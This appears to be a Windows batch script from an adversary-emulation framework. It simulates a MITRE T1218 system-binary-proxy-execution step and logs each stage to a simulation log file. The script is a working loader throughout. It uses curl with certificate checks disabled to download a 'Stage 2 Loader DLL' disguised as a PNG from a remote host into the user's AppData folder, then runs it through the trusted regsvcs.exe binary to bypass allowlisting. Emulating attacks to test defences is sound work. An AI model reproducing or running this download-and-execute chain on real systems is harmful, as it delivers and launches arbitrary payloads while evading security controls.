@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET aBcD1=%APPDATA%\12061\43597245
SET eFgH2=a90fad7a.txt
SET iJkL3=https://10.0.0.49/stage/2/icon.png?12061-7
SET mNoP4=ITZEL-S2B
SET qRsT5=12061
SET uVwX6=7
SET yZaB7=%PUBLIC%\\macula-simulations.log
SET cDeF8=https://10.0.0.49

REM Cache global debug timestamp
SET tsvar=!DATE!/!TIME!

REM Debug: script_start
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: script_start>> "!yZaB7!" 2>nul

REM Step 1: Heartbeat fetch (download Stage 2 Loader DLL)
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: heartbeat_start>> "!yZaB7!" 2>nul
curl -k -s -o "!aBcD1!\!eFgH2!" "!iJkL3!"
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: heartbeat_complete>> "!yZaB7!" 2>nul

REM Step 2: Position working directory
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: chdir_start>> "!yZaB7!" 2>nul
cd /d "!aBcD1!" >nul 2>&1
set chdir_err=!errorlevel!
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: chdir_result=!chdir_err!>> "!yZaB7!" 2>nul

REM Step 3: Invoke Stage 2 DLL via regsvcs.exe /U
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: regsvcs_start>> "!yZaB7!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!eFgH2!" >NUL 2>&1
set regsvcs_exit=!errorlevel!
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: regsvcs_result=!regsvcs_exit!>> "!yZaB7!" 2>nul

REM Generate precise timestamp for TTP log
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t

REM TTP Log (T1218^|System Binary Proxy Execution)
if !regsvcs_exit! equ 0 (
    echo [!timestamp!][TTP][!mNoP4!][!qRsT5!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!yZaB7!" 2>&1
) else (
    echo [!timestamp!][TTP][!mNoP4!][!qRsT5!]: T1218^|System Binary Proxy Execution=[FAIL]:[regsvcs_exit_!regsvcs_exit!]>> "!yZaB7!" 2>&1
)

REM Debug: script_end
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: script_end>> "!yZaB7!" 2>nul

endlocal